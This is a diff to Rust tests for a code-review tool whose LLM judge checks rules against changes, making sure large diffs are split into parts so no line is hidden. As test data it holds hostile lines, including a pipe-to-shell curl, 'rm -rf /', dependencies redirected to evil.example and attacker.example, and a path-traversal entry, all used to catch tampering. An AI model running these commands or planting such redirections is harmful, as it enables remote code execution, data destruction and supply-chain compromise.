@@ -1366,7 +1366,8 @@ fn the_judge_sees_the_engines_match_facts() {
 /// see may break the rule); a BROKEN still is.
 #[test]
 fn on_a_cut_diff_only_a_broken_verdict_counts() {
-    let big = format!("{DIFF}{}", "+x\n".repeat(EVIDENCE_CAP));
+    // (core#1474) Bigger than MAX_PARTS parts can show: the part beyond them is cut.
+    let big = format!("{DIFF}{}", "+x\n".repeat(EVIDENCE_CAP * 3));
     let c = change_of(&big, &["src/add.rs"]);
     let judge = Fake::new(&[
         ("K", "KEPT — src/add.rs looks fine"),
@@ -4101,4 +4102,502 @@ fn core1381_the_substance_judge_is_told_text_only_changes_are_not_applicable() {
                 && p.contains("A change that adds or changes logic is judged, never N/A")),
         "{sub:?}"
     );
+}
+
+// ── core#1474 v2: the judge reads every changed line, in parts when the change is big ──
+
+/// A file section of `n` added lines of `width` bytes each.
+fn big_file(path: &str, n: usize, width: usize) -> String {
+    let mut s =
+        format!("diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -0,0 +1,{n} @@\n");
+    for i in 0..n {
+        s.push_str(&format!("+{:0w$}\n", i, w = width.saturating_sub(2)));
+    }
+    s
+}
+
+#[test]
+fn core_1474_parts_leave_nothing_out_and_repeat_each_files_header() {
+    let diff = format!(
+        "{}{}{}",
+        big_file("Cargo.lock", 9000, 30),
+        DIFF,
+        big_file("src/gen.rs", 3000, 40)
+    );
+    let cap = 64 * 1024;
+    let parts = diff_parts(&diff, cap);
+    assert!(parts.len() > 3, "{}", parts.len());
+    for p in &parts {
+        assert!(p.len() <= cap, "{}", p.len());
+        assert!(
+            p.starts_with("diff --git "),
+            "every part names its file: {}",
+            &p[..60]
+        );
+    }
+    // Nothing left out: every line of the diff is in a part, in order (headers may repeat).
+    let joined: String = parts.concat();
+    let mut at = 0;
+    for line in diff.lines() {
+        let found = joined[at..]
+            .find(line)
+            .expect("every line of the change is in a part");
+        at += found;
+    }
+    assert!(
+        diff_parts(DIFF, cap) == vec![DIFF.to_string()],
+        "a small change is one part"
+    );
+}
+
+#[test]
+fn core_1474_part_answers_combine_broken_first_then_misses_then_kept() {
+    let a = |st: RuleStatus, c: &str| Answer {
+        status: st,
+        cite: c.into(),
+    };
+    let p = |ans: &[(&str, Answer)], miss: &[(&str, Miss)]| Parsed {
+        answers: ans
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.clone()))
+            .collect(),
+        misses: miss
+            .iter()
+            .map(|(k, v)| (k.to_string(), v.clone()))
+            .collect(),
+    };
+    let parts = vec![
+        p(
+            &[
+                ("B", a(RuleStatus::NotApplicable, "n")),
+                ("K", a(RuleStatus::Kept, "src/add.rs")),
+                ("U", a(RuleStatus::Kept, "src/add.rs")),
+            ],
+            &[],
+        ),
+        p(
+            &[
+                ("K", a(RuleStatus::NotApplicable, "n")),
+                ("N", a(RuleStatus::NotApplicable, "n")),
+            ],
+            &[("U", Miss::Unsure("?".into()))],
+        ),
+        p(
+            &[
+                ("B", a(RuleStatus::Broken, "src/x.rs: no test")),
+                ("N", a(RuleStatus::NotApplicable, "n")),
+            ],
+            &[],
+        ),
+    ];
+    let c = combine_parts(&parts, &["B", "K", "U", "N"], 3);
+    assert_eq!(c.answers["B"].status, RuleStatus::Broken);
+    assert!(
+        c.answers["B"].cite.starts_with("part 3 of 3:"),
+        "{}",
+        c.answers["B"].cite
+    );
+    assert_eq!(c.answers["K"].status, RuleStatus::Kept);
+    assert!(
+        matches!(c.misses["U"], Miss::Unsure(_)),
+        "a part that could not decide leaves it unanswered"
+    );
+    assert_eq!(c.answers["N"].status, RuleStatus::NotApplicable);
+}
+
+/// (core#1474) The issue's case: a 250 KB lock and a code change. Every rule is answered on the
+/// whole change (no cut), in parts, each part named to the judge; a BROKEN in the lock's part counts.
+#[test]
+fn core_1474_a_lockfile_heavy_diff_is_judged_whole_in_parts() {
+    struct PartJudge(Mutex<Vec<String>>);
+    impl RuleJudge for PartJudge {
+        fn ask(&self, _seat: &str, prompt: &str) -> JudgeAnswer {
+            self.0.lock().unwrap().push(prompt.to_string());
+            let nonce = nonce_of(prompt);
+            // KEPT on the code part; N/A elsewhere; R2 BROKEN only where the lock's evil URL is.
+            let code = prompt.contains("fn add(a: i32");
+            let evil = prompt.contains("evil.example");
+            let mut out = format!("BEGIN VERDICTS {nonce}\n");
+            for id in asked_ids(prompt) {
+                let line = match (id.as_str(), code, evil) {
+                    ("R2", _, true) => "BROKEN — Cargo.lock moves a dependency to evil.example",
+                    (_, true, _) => "KEPT — src/add.rs takes typed numbers",
+                    _ => "N/A — this part does not touch it",
+                };
+                out.push_str(&format!("RULE {id}: {line}\n"));
+            }
+            out.push_str(&format!("END VERDICTS {nonce}\n"));
+            JudgeAnswer::Answered(out)
+        }
+    }
+    let lock = big_file("Cargo.lock", 9000, 30).replace(
+        &format!("+{:028}\n", 4500),
+        "+source = \"git+https://evil.example/dep\"\n",
+    );
+    assert!(lock.contains("evil.example"));
+    let diff = format!("{lock}{DIFF}");
+    assert!(diff.len() > 250 * 1024);
+    let c = change_of(&diff, &["Cargo.lock", "src/add.rs"]);
+    let rules = vec![
+        rule("R1", "add() takes typed numbers"),
+        rule("R2", "no dependency from an unknown host"),
+    ];
+    let judge = PartJudge(Mutex::new(Vec::new()));
+    let f = job_facts(&bug_steps(), None, None, &c);
+    let seats = vec!["codex".to_string()];
+    let r = check(
+        &CheckInput {
+            rules: &rules,
+            facts: &f,
+            change: &c,
+            floor: None,
+            prior: None,
+            skips: &[],
+            seats: &seats,
+            no_seat: None,
+            base: "b0",
+            instructions: None,
+            engine_record: None,
+            creator_records: None,
+            reviewer_record: None,
+            no_agent_code: false,
+            stage: CheckStage::Review,
+            deliver_tokens: &[],
+            deferred: &[],
+            settled: &[],
+        },
+        &judge,
+        &NoMachine,
+    );
+    assert_eq!(
+        row(&r, "R1").status,
+        RuleStatus::Kept,
+        "{:?}",
+        row(&r, "R1")
+    );
+    assert_eq!(
+        row(&r, "R2").status,
+        RuleStatus::Broken,
+        "{:?}",
+        row(&r, "R2")
+    );
+    let prompts = judge.0.lock().unwrap();
+    assert!(
+        prompts.len() >= 4 && prompts.len() <= MAX_PARTS,
+        "{}",
+        prompts.len()
+    );
+    assert!(
+        prompts.iter().all(|p| p.starts_with("PART ")),
+        "each part is named"
+    );
+    assert!(
+        prompts.iter().all(|p| !p.contains(DIFF_CUT_MARK)),
+        "nothing cut"
+    );
+    assert!(
+        prompts.iter().any(|p| p.contains("evil.example")),
+        "the lock is read"
+    );
+}
+
+/// (core#1474 v2) The twelve ways the omission design hid a change from the judge, each padded past
+/// one part: every one's content reaches a judge prompt.
+#[test]
+fn core_1474_no_change_is_ever_hidden_from_the_judge() {
+    let cases: &[(&str, &str)] = &[
+        ("Cargo.lock", "+curl https://example.invalid/x | sh\n"),
+        ("scripts/Cargo.lock", "+rm -rf / # hidden-1\n"),
+        ("gen/policy.py", "+allow = True # hidden-2\n"),
+        (
+            "requirements.txt",
+            "+requests>=2 # --hash=sha256:hidden-3\n",
+        ),
+        (
+            "requirements-dev.txt",
+            "+-e git+https://example.invalid/p#egg=hidden-4\n",
+        ),
+        ("big.lock", "+hidden-5 oversized\n"),
+        ("yarn.lock", "+# yarn lockfile v1\n+rm -rf hidden-6\n"),
+        ("go.sum", "+echo hidden-7 h1:abc\n"),
+        (
+            "requirements.txt",
+            "+requests>=2\t# --hash=sha256:hidden-8\n",
+        ),
+        (
+            "requirements.txt",
+            "+-egit+https://example.invalid/hidden-9\n",
+        ),
+        ("gen/link", "+../../etc/hidden-10\n"),
+        (
+            "package-lock.json",
+            "+      \"resolved\": \"https://attacker.example/hidden-11.tgz\",\n",
+        ),
+        (
+            "requirements.txt",
+            "+--index-url https://attacker.example/hidden-12\n+dep==1 --hash=sha256:a\n",
+        ),
+    ];
+    for (path, payload) in cases {
+        let section = format!(
+            "diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -1 +1,3 @@\n{payload}"
+        );
+        let diff = format!(
+            "{}{section}{}",
+            big_file("pad/a.json", 4000, 30),
+            big_file("pad/b.json", 4000, 30)
+        );
+        let c = change_of(&diff, &[path, "pad/a.json", "pad/b.json"]);
+        let judge = Fake::new(&[("R1", "N/A — no subject")]);
+        let _ = run_seated(
+            &[rule("R1", "no hidden change")],
+            &c,
+            &judge,
+            &["codex"],
+            None,
+        );
+        let marker = payload.trim_start_matches('+').lines().next().unwrap();
+        assert!(
+            judge
+                .prompts
+                .lock()
+                .unwrap()
+                .iter()
+                .any(|(_, p)| p.contains(marker)),
+            "{path}: the change reaches the judge"
+        );
+    }
+}
+
+/// (core#1474 v2) A seat that cannot answer a later part ends the batch like a timeout: its rules
+/// are asked again on another seat, which reads every part.
+#[test]
+fn core_1474_a_part_the_seat_cannot_answer_moves_the_batch_to_another_seat() {
+    struct FailsPart2(Mutex<Vec<(String, String)>>);
+    impl RuleJudge for FailsPart2 {
+        fn ask(&self, seat: &str, prompt: &str) -> JudgeAnswer {
+            self.0
+                .lock()
+                .unwrap()
+                .push((seat.to_string(), prompt[..12].to_string()));
+            if seat == "codex" && prompt.starts_with("PART 2 ") {
+                return JudgeAnswer::TimedOut("timed out".into());
+            }
+            let nonce = nonce_of(prompt);
+            let mut out = format!("BEGIN VERDICTS {nonce}\n");
+            for id in asked_ids(prompt) {
+                out.push_str(&format!("RULE {id}: N/A — not touched\n"));
+            }
+            JudgeAnswer::Answered(out + &format!("END VERDICTS {nonce}\n"))
+        }
+    }
+    let diff = format!(
+        "{}{}",
+        big_file("a.json", 4000, 30),
+        big_file("b.json", 4000, 30)
+    );
+    let c = change_of(&diff, &["a.json", "b.json"]);
+    let judge = FailsPart2(Mutex::new(Vec::new()));
+    let f = job_facts(&bug_steps(), None, None, &c);
+    let seats = vec!["codex".to_string(), "pi".to_string()];
+    let r = check(
+        &CheckInput {
+            rules: &[rule("R1", "x")],
+            facts: &f,
+            change: &c,
+            floor: None,
+            prior: None,
+            skips: &[],
+            seats: &seats,
+            no_seat: None,
+            base: "b0",
+            instructions: None,
+            engine_record: None,
+            creator_records: None,
+            reviewer_record: None,
+            no_agent_code: false,
+            stage: CheckStage::Review,
+            deliver_tokens: &[],
+            deferred: &[],
+            settled: &[],
+        },
+        &judge,
+        &NoMachine,
+    );
+    assert_eq!(
+        r.rows[0].status,
+        RuleStatus::NotApplicable,
+        "{:?}",
+        r.rows[0]
+    );
+    let calls = judge.0.lock().unwrap();
+    assert!(
+        calls
+            .iter()
+            .any(|(s, p)| s == "pi" && p.starts_with("PART 2 ")),
+        "{calls:?}"
+    );
+}
+
+/// (codex on #1514 v2) Parts and failures never lose what was found or hide what changed:
+/// - a BROKEN in part 1 survives part 2 timing out (no passing retry elsewhere), marked not whole;
+/// - a later part's seat failure benches the seat for the check (`refused`);
+/// - a cite names the true part count, and the report the parts the change needs;
+/// - a very long file header never crowds the change out of a part.
+#[test]
+fn core_1474_parts_keep_a_broken_name_the_total_and_never_lose_the_change() {
+    struct Scripted {
+        seen: Mutex<Vec<(String, String)>>,
+        part2: JudgeAnswer,
+    }
+    impl RuleJudge for Scripted {
+        fn ask(&self, seat: &str, prompt: &str) -> JudgeAnswer {
+            self.seen
+                .lock()
+                .unwrap()
+                .push((seat.to_string(), prompt.to_string()));
+            if seat == "codex" && prompt.starts_with("PART 2 ") {
+                return self.part2.clone();
+            }
+            let nonce = nonce_of(prompt);
+            let line = if prompt.starts_with("PART 1 ") && seat == "codex" {
+                "BROKEN — a.json: unsafe"
+            } else {
+                "N/A — not touched"
+            };
+            let mut out = format!("BEGIN VERDICTS {nonce}\n");
+            for id in asked_ids(prompt) {
+                out.push_str(&format!("RULE {id}: {line}\n"));
+            }
+            JudgeAnswer::Answered(out + &format!("END VERDICTS {nonce}\n"))
+        }
+    }
+    let run_with = |judge: &Scripted, c: &Change| {
+        let f = job_facts(&bug_steps(), None, None, c);
+        let seats = vec!["codex".to_string(), "pi".to_string()];
+        check(
+            &CheckInput {
+                rules: &[rule("R1", "x")],
+                facts: &f,
+                change: c,
+                floor: None,
+                prior: None,
+                skips: &[],
+                seats: &seats,
+                no_seat: None,
+                base: "b0",
+                instructions: None,
+                engine_record: None,
+                creator_records: None,
+                reviewer_record: None,
+                no_agent_code: false,
+                stage: CheckStage::Review,
+                deliver_tokens: &[],
+                deferred: &[],
+                settled: &[],
+            },
+            judge,
+            &NoMachine,
+        )
+    };
+    let diff = format!(
+        "{}{}",
+        big_file("a.json", 4000, 30),
+        big_file("b.json", 4000, 30)
+    );
+    let c = change_of(&diff, &["a.json", "b.json"]);
+    for part2 in [
+        JudgeAnswer::TimedOut("timed out".into()),
+        JudgeAnswer::SeatFailed("not signed in".into()),
+    ] {
+        let judge = Scripted {
+            seen: Mutex::new(Vec::new()),
+            part2: part2.clone(),
+        };
+        let r = run_with(&judge, &c);
+        assert_eq!(
+            r.rows[0].status,
+            RuleStatus::Broken,
+            "{part2:?}: {:?}",
+            r.rows[0]
+        );
+        assert_eq!(
+            r.rows[0].evidence_complete,
+            Some(false),
+            "not every part was read"
+        );
+        assert!(r.parts >= 4, "{}", r.parts);
+        if matches!(part2, JudgeAnswer::SeatFailed(_)) {
+            assert!(r.refused.contains(&"codex".to_string()), "{:?}", r.refused);
+        }
+    }
+    // The cite names the true total, also past the cap.
+    let a = |st: RuleStatus| Answer {
+        status: st,
+        cite: "x".into(),
+    };
+    let parts = vec![Parsed {
+        answers: [("B".to_string(), a(RuleStatus::Broken))].into(),
+        misses: BTreeMap::new(),
+    }];
+    assert!(combine_parts(&parts, &["B"], 12).answers["B"]
+        .cite
+        .starts_with("part 1 of 12:"));
+    // A 3,900-byte path: every part still carries the changed lines, never only the header.
+    let long = format!("{}/x.json", "d".repeat(3900));
+    let diff = big_file(&long, 2000, 30);
+    let parts = diff_parts(&diff, 12 * 1024);
+    let added = |s: &str| {
+        s.lines()
+            .filter(|l| l.starts_with('+') && !l.starts_with("+++"))
+            .count()
+    };
+    assert_eq!(
+        parts.iter().map(|p| added(p)).sum::<usize>(),
+        2000,
+        "every changed line is in a part"
+    );
+    for p in &parts {
+        assert!(p.len() <= 12 * 1024, "{}", p.len());
+    }
+    // No part is bigger than the budget, so the prompt never cuts a part (the change is never
+    // crowded out by a header the prompt truncates).
+}
+
+/// (codex r2 on #1514 v2) A line near or over the budget is never cut away: every byte of it reaches
+/// a part no bigger than the budget; and two long paths sharing a prefix keep apart in the
+/// continuation lines (the file's own name is kept).
+#[test]
+fn core_1474_long_lines_and_long_paths_survive_the_parts() {
+    let cap = 64 * 1024;
+    for n in [cap - 10, cap + 5000, 3 * cap] {
+        let payload = format!("{}END-MARKER", "x".repeat(n));
+        let diff = format!(
+            "diff --git a/a.txt b/a.txt\n--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-old\n+{payload}\n{}",
+            big_file("b.txt", 100, 30)
+        );
+        let parts = diff_parts(&diff, cap);
+        assert!(parts.iter().all(|p| p.len() <= cap), "{n}");
+        let total_x: usize = parts.iter().map(|p| p.matches('x').count()).sum();
+        assert!(total_x >= n, "{n}: every byte of the line is in a part");
+        assert!(
+            parts.iter().any(|p| p.contains("END-MARKER")),
+            "{n}: its end too"
+        );
+    }
+    let prefix = "d".repeat(6000);
+    let diff = format!(
+        "{}{}",
+        big_file(&format!("{prefix}/safe_config.rs"), 3000, 30),
+        big_file(&format!("{prefix}/sensitive_config.rs"), 3000, 30)
+    );
+    let parts = diff_parts(&diff, 16 * 1024);
+    let continued: Vec<&str> = parts
+        .iter()
+        .filter_map(|p| p.lines().next().filter(|l| l.starts_with("[continued:")))
+        .collect();
+    assert!(continued
+        .iter()
+        .any(|l| l.contains("safe_config.rs") && !l.contains("sensitive")));
+    assert!(continued.iter().any(|l| l.contains("sensitive_config.rs")));
 }
